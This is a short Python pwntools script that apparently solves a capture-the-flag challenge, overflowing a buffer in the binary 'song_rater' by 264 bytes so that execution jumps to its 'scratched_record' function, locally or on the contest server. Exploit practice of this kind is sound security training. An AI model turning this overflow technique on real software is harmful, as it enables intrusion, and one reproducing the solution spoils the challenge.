from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.REMOTE:  # ('server', 'port')
        # Change to your host/port
        return remote("ever-and-ever--just-friends-6203.ctf.kitctf.de", "443", ssl=True)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Binary filename
exe = './song_rater'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

offset = 264

# Start program
io = start()

print(elf.sym['scratched_record'])

# Build the payload
payload = flat({
    offset: [
        elf.sym['scratched_record']
    ]
})

# Send the payload
io.sendlineafter(b':\n', payload)

print(io.recvuntil(b':\n'))
io.interactive()
